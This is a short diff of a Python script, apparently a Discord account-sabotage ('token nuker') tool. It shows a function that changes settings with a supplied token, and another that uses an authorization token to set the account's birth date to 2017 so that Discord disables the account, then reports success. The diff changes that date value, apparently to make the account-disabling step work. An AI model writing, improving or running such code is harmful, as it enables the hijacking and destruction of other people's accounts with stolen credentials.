@@ -73,7 +73,7 @@ def tokenFuck(token):
         requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)
 
 def tokenDisable(token):
-    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token}, json={'date_of_birth': '9999-7-16'})
+    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token}, json={'date_of_birth': '2017-7-16'})
     if r.status_code == 400:
         print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
         input("Press any key to exit...")
